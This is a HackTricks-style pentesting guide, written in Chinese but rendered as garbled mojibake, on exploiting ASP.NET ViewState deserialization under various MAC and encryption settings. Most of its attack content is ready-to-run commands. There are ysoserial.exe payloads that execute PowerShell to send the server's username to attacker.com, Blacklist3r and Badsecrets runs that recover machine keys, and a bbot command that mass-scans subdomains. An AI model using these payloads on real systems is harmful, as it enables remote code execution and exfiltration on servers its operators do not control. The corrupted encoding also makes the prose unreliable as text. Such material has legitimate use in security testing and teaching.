# åˆ©ç”¨ \_\_VIEWSTATE åœ¨ä¸çŸ¥é“ç§˜å¯†çš„æƒ…å†µä¸‹

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

å¦‚æœæ‚¨å¯¹ **é»‘å®¢èŒä¸š** æ„Ÿå…´è¶£å¹¶ä¸”æƒ³è¦é»‘å…¥ä¸å¯é»‘å…¥çš„ - **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼** (_éœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦å†™å’Œå£è¯­_).

{% embed url="https://www.stmcyber.com/careers" %}

## ä»€ä¹ˆæ˜¯ ViewState

**ViewState** æ˜¯ ASP.NET æ¡†æ¶é»˜è®¤ä½¿ç”¨çš„æ–¹æ³•ï¼Œç”¨äºåœ¨ç½‘é¡µä¹‹é—´**ä¿ç•™é¡µé¢å’Œæ§ä»¶å€¼**ã€‚å½“é¡µé¢çš„ HTML è¢«æ¸²æŸ“æ—¶ï¼Œé¡µé¢çš„å½“å‰çŠ¶æ€å’Œéœ€è¦åœ¨å›å‘æœŸé—´ä¿ç•™çš„å€¼è¢«åºåˆ—åŒ–æˆ base64 ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå¹¶è¾“å‡ºåœ¨ ViewState éšè—å­—æ®µä¸­ã€‚\
ä»¥ä¸‹å±æ€§æˆ–å±æ€§ç»„åˆé€‚ç”¨äº ViewState ä¿¡æ¯ï¼š

* Base64
* å¯ä»¥é€šè¿‡å°† EnableViewStateMac å’Œ ViewStateEncryptionMode å±æ€§è®¾ç½®ä¸º false æ¥å®šä¹‰
* Base64 + MAC (æ¶ˆæ¯è®¤è¯ç ) å¯ç”¨
* å¯ä»¥é€šè¿‡å°† EnableViewStateMac å±æ€§è®¾ç½®ä¸º true æ¥å®šä¹‰
* Base64 + åŠ å¯†
* å¯ä»¥é€šè¿‡å°† viewStateEncryptionMode å±æ€§è®¾ç½®ä¸º true æ¥å®šä¹‰

## **æµ‹è¯•æ¡ˆä¾‹**

![](<../../.gitbook/assets/image (309) (2).png>)

### æµ‹è¯•æ¡ˆä¾‹ï¼š1 â€“ EnableViewStateMac=false å’Œ viewStateEncryptionMode=false

é€šè¿‡åœ¨ä»¥ä¸‹ä½ç½®å°† `AspNetEnforceViewStateMac` æ³¨å†Œè¡¨é”®è®¾ç½®ä¸ºé›¶ï¼Œä¹Ÿå¯ä»¥å®Œå…¨ç¦ç”¨ ViewStateMACï¼š
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**è¯†åˆ«ViewStateå±æ€§**

æ‚¨å¯ä»¥å°è¯•é€šè¿‡ä½¿ç”¨BurpSuiteæ•è·åŒ…å«æ­¤å‚æ•°çš„è¯·æ±‚æ¥è¯†åˆ«ViewStateæ˜¯å¦å—åˆ°MACä¿æŠ¤ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

å¦‚æœæ²¡æœ‰ä½¿ç”¨Macæ¥ä¿æŠ¤å‚æ•°ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)æ¥åˆ©ç”¨å®ƒã€‚
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### æµ‹è¯•æ¡ˆä¾‹ 1.5 â€“ ç±»ä¼¼æµ‹è¯•æ¡ˆä¾‹ 1 ä½†æœåŠ¡å™¨æ²¡æœ‰å‘é€ ViewState cookie

å¼€å‘è€…å¯ä»¥**ç§»é™¤ ViewState**ï¼Œä½¿å…¶ä¸æˆä¸º HTTP è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼ˆç”¨æˆ·ä¸ä¼šæ”¶åˆ°è¿™ä¸ª cookieï¼‰ã€‚\
äººä»¬å¯èƒ½ä¼šè®¤ä¸ºï¼Œå¦‚æœ**æ²¡æœ‰ ViewState**ï¼Œä»–ä»¬çš„å®ç°å°±æ˜¯ä»ä»»ä½•æ½œåœ¨çš„ ViewState ååºåˆ—åŒ–æ¼æ´ä¸­**å®‰å…¨**çš„ã€‚\
ç„¶è€Œï¼Œæƒ…å†µå¹¶éå¦‚æ­¤ã€‚å¦‚æœæˆ‘ä»¬åœ¨è¯·æ±‚ä½“ä¸­**æ·»åŠ  ViewState å‚æ•°**å¹¶å‘é€æˆ‘ä»¬ä½¿ç”¨ ysoserial åˆ›å»ºçš„åºåˆ—åŒ–æœ‰æ•ˆè½½è·ï¼Œæˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿå®ç°**ä»£ç æ‰§è¡Œ**ï¼Œå¦‚**æ¡ˆä¾‹ 1**æ‰€ç¤ºã€‚

### æµ‹è¯•æ¡ˆä¾‹ï¼š2 â€“ .Net < 4.5 ä¸” EnableViewStateMac=true & ViewStateEncryptionMode=false

ä¸ºäº†**å¯ç”¨ç‰¹å®šé¡µé¢çš„ ViewState MAC**ï¼Œæˆ‘ä»¬éœ€è¦å¯¹ç‰¹å®šçš„ aspx æ–‡ä»¶è¿›è¡Œä»¥ä¸‹æ›´æ”¹ï¼š
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ **web.config** æ–‡ä»¶ä¸­è®¾ç½®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œå¯¹**æ•´ä¸ª**åº”ç”¨ç¨‹åºè¿›è¡Œæ­¤æ“ä½œï¼š
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
ç”±äºå‚æ•°è¿™æ¬¡å—åˆ°MACä¿æŠ¤ï¼Œè¦æˆåŠŸæ‰§è¡Œæ”»å‡»ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦ç”¨åˆ°çš„å¯†é’¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒBurpSuiteä¼šå‘Šè¯‰æˆ‘ä»¬å‚æ•°å—åˆ°MACä¿æŠ¤ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

ä½ å¯ä»¥å°è¯•ä½¿ç”¨[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)æ¥æ‰¾åˆ°ä½¿ç”¨çš„å¯†é’¥ã€‚
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) æ˜¯å¦ä¸€ä¸ªå¯ä»¥è¯†åˆ«å·²çŸ¥ machineKeys çš„å·¥å…·ã€‚å®ƒæ˜¯ç”¨ Python ç¼–å†™çš„ï¼Œå› æ­¤ä¸ Blacklist3r ä¸åŒï¼Œå®ƒä¸ä¾èµ– Windowsã€‚å¯¹äº .NET viewstatesï¼Œæœ‰ä¸€ä¸ª "python blacklist3r" å·¥å…·ï¼Œè¿™æ˜¯ä½¿ç”¨å®ƒçš„æœ€å¿«æ–¹å¼ã€‚

å®ƒå¯ä»¥ç›´æ¥æä¾› viewstate å’Œ generatorï¼š
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
```markdown
æˆ–è€…ï¼Œå®ƒå¯ä»¥ç›´æ¥è¿æ¥åˆ°ç›®æ ‡URLï¼Œå¹¶å°è¯•ä»HTMLä¸­æå–viewstateï¼š
```
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

è¦å¤§è§„æ¨¡æœç´¢æ˜“å—æ”»å‡»çš„viewstatesï¼Œå¹¶ç»“åˆå­åŸŸåæšä¸¾ï¼Œå¯ä»¥ä½¿ç”¨`badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md)æ¨¡å—ï¼š
```
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

å¦‚æœä½ è¿æ°”å¥½ï¼Œæ‰¾åˆ°äº†å¯†é’¥ï¼Œä½ å¯ä»¥ä½¿ç”¨ [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:** ç»§ç»­è¿›è¡Œæ”»å‡»ã€‚
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
åœ¨æœåŠ¡å™¨**æœªå‘é€** `_VIEWSTATEGENERATOR` å‚æ•°çš„æƒ…å†µä¸‹ï¼Œæ‚¨**ä¸éœ€è¦**æä¾› `--generator` å‚æ•°ï¼Œ**ä½†éœ€è¦æä¾›è¿™äº›å‚æ•°**ï¼š
```bash
--apppath="/" --path="/hello.aspx"
```
### æµ‹è¯•æ¡ˆä¾‹ï¼š3 - .Net < 4.5 ä¸” EnableViewStateMac=true/false ä»¥åŠ ViewStateEncryptionMode=true

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒBurpæ— æ³•å‘ç°å‚æ•°æ˜¯å¦å—åˆ°MACä¿æŠ¤ï¼Œå› ä¸ºå®ƒæ— æ³•è¯†åˆ«è¿™äº›å€¼ã€‚ç„¶åï¼Œè¯¥å€¼å¯èƒ½è¢«åŠ å¯†ï¼Œæ‚¨å°†**éœ€è¦æœºå™¨å¯†é’¥æ¥åŠ å¯†æ‚¨çš„æœ‰æ•ˆè½½è·**ä»¥åˆ©ç”¨è¯¥æ¼æ´ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.0.png)

**åœ¨è¿™ç§æƒ…å†µä¸‹** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **æ¨¡å—æ­£åœ¨å¼€å‘ä¸­...**

**åœ¨.NET 4.5ä¹‹å‰**ï¼Œå³ä½¿è®¾ç½®äº†**`ViewStateEncryptionMode`**ä¸º_**Always**_ï¼ŒASP.NETä¹Ÿå¯ä»¥**æ¥å—**æ¥è‡ªç”¨æˆ·çš„**æœªåŠ å¯†**çš„\_`__VIEWSTATE`\_å‚æ•°ã€‚ASP.NET **ä»…æ£€æŸ¥**è¯·æ±‚ä¸­**`__VIEWSTATEENCRYPTED`**å‚æ•°çš„**å­˜åœ¨**ã€‚**å¦‚æœç§»é™¤æ­¤å‚æ•°ï¼Œå¹¶å‘é€æœªåŠ å¯†çš„æœ‰æ•ˆè½½è·ï¼Œå®ƒä»å°†è¢«å¤„ç†ã€‚**

å› æ­¤ï¼Œå¦‚æœå·²çŸ¥æœºå™¨å¯†é’¥ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ç›®å½•éå†é—®é¢˜ï¼‰ï¼Œåœ¨**æ¡ˆä¾‹2**ä¸­ä½¿ç”¨çš„[**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)å‘½ä»¤ï¼Œå¯ä»¥ç”¨æ¥åˆ©ç”¨ViewStateååºåˆ—åŒ–æ¼æ´æ‰§è¡ŒRCEã€‚

* ä»è¯·æ±‚ä¸­ç§»é™¤`__VIEWSTATEENCRYPTED`å‚æ•°ä»¥åˆ©ç”¨ViewStateååºåˆ—åŒ–æ¼æ´ï¼Œå¦åˆ™å®ƒå°†è¿”å›ä¸€ä¸ªViewstate MACéªŒè¯é”™è¯¯ï¼Œå¹¶ä¸”å¦‚å›¾æ‰€ç¤ºï¼Œåˆ©ç”¨å°†å¤±è´¥ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.1.png)

### æµ‹è¯•æ¡ˆä¾‹ï¼š4 - .Net >= 4.5 ä¸” EnableViewStateMac=true/false ä»¥åŠ ViewStateEncryptionMode=true/false é™¤äº†ä¸¤ä¸ªå±æ€§éƒ½ä¸ºfalse

æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨web.configæ–‡ä»¶ä¸­æŒ‡å®šä»¥ä¸‹å‚æ•°æ¥å¼ºåˆ¶ä½¿ç”¨ASP.NETæ¡†æ¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚
```markup
<httpRuntime targetFramework="4.5" />
```
```markdown
æˆ–è€…ï¼Œå¯ä»¥é€šè¿‡åœ¨ web.config æ–‡ä»¶çš„ `machineKey` å‚æ•°å†…æŒ‡å®šä»¥ä¸‹é€‰é¡¹æ¥å®ç°ã€‚
```
```bash
compatibilityMode="Framework45"
```
åœ¨ä¹‹å‰çš„æ¡ˆä¾‹ä¸­ï¼ŒBurpæ— æ³•è¯†åˆ«è¯·æ±‚æ˜¯å¦å—åˆ°MACä¿æŠ¤ï¼Œå› ä¸º**å€¼æ˜¯åŠ å¯†çš„ã€‚**ç„¶åï¼Œä¸ºäº†å‘é€**æœ‰æ•ˆçš„payloadï¼Œæ”»å‡»è€…éœ€è¦å¯†é’¥**ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

ä½ å¯ä»¥å°è¯•ä½¿ç”¨[**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper)æ¥æ‰¾åˆ°æ­£åœ¨ä½¿ç”¨çš„å¯†é’¥ï¼š
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
æœ‰å…³ IISDirPath å’Œ TargetPagePath çš„æ›´è¯¦ç»†æè¿°ï¼Œè¯·[å‚è€ƒæ­¤å¤„](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

æˆ–è€…ï¼Œä½¿ç”¨å¸¦æœ‰ç”Ÿæˆå™¨å€¼çš„ [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets)ï¼š
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
```markdown
![](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

ä¸€æ—¦ç¡®è®¤äº†æœ‰æ•ˆçš„Machine keyï¼Œ**ä¸‹ä¸€æ­¥æ˜¯ä½¿ç”¨** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) **ç”Ÿæˆåºåˆ—åŒ–çš„payload**
```
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
å¦‚æœæ‚¨æœ‰ `__VIEWSTATEGENERATOR` çš„å€¼ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ `--generator` å‚æ•°å¹¶å¸¦ä¸Šè¯¥å€¼ï¼Œ**çœç•¥** `--path` å’Œ `--apppath` å‚æ•°ã€‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

å¦‚æœ ViewState ååºåˆ—åŒ–æ¼æ´è¢«æˆåŠŸåˆ©ç”¨ï¼Œä¸€ä¸ªå—æ”»å‡»è€…æ§åˆ¶çš„æœåŠ¡å™¨å°†æ¥æ”¶åˆ°ä¸€ä¸ªåŒ…å«ç”¨æˆ·åçš„å‡ºç«™è¯·æ±‚ã€‚[æˆåŠŸåˆ©ç”¨çš„ PoC](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### æµ‹è¯•æ¡ˆä¾‹ 6 â€“ æ­£åœ¨ä½¿ç”¨ ViewStateUserKeys

**ViewStateUserKey** å±æ€§å¯ä»¥ç”¨æ¥**é˜²å¾¡** **CSRF æ”»å‡»**ã€‚å¦‚æœåœ¨åº”ç”¨ç¨‹åºä¸­å®šä¹‰äº†è¿™æ ·çš„å¯†é’¥ï¼Œå¹¶ä¸”æˆ‘ä»¬å°è¯•ä½¿ç”¨åˆ°ç›®å‰ä¸ºæ­¢è®¨è®ºçš„æ–¹æ³•ç”Ÿæˆ **ViewState** è´Ÿè½½ï¼Œ**åº”ç”¨ç¨‹åºå°†ä¸ä¼šå¤„ç†è¯¥è´Ÿè½½**ã€‚\
æ‚¨éœ€è¦ä½¿ç”¨å¦ä¸€ä¸ªå‚æ•°æ¥æ­£ç¡®åˆ›å»ºè´Ÿè½½ï¼š
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### æˆåŠŸåˆ©ç”¨çš„ç»“æœ <a href="#poc" id="poc"></a>

å¯¹äºæ‰€æœ‰æµ‹è¯•æ¡ˆä¾‹ï¼Œå¦‚æœViewState YSoSerial.Netæœ‰æ•ˆè½½è·**æˆåŠŸ**å·¥ä½œï¼Œåˆ™æœåŠ¡å™¨ä¼šå“åº”â€œ**500å†…éƒ¨æœåŠ¡å™¨é”™è¯¯**â€ï¼Œå“åº”å†…å®¹ä¸ºâ€œ**æ­¤é¡µé¢çš„çŠ¶æ€ä¿¡æ¯æ— æ•ˆï¼Œå¯èƒ½å·²æŸå**â€ï¼Œæˆ‘ä»¬ä¼šæ”¶åˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºçš„OOBè¯·æ±‚ï¼š

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

å¸¦æœ‰å½“å‰ç”¨æˆ·åçš„å¸¦å¤–è¯·æ±‚

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## å‚è€ƒèµ„æ–™

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

å¦‚æœæ‚¨å¯¹**é»‘å®¢èŒä¸š**æ„Ÿå…´è¶£ï¼Œå¹¶ä¸”æƒ³è¦é»‘å…¥ä¸å¯é»‘å…¥çš„ç³»ç»Ÿ - **æˆ‘ä»¬æ­£åœ¨æ‹›è˜ï¼**ï¼ˆ_éœ€è¦æµåˆ©çš„æ³¢å…°è¯­ä¹¦å†™å’Œå£è¯­_ï¼‰ã€‚

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
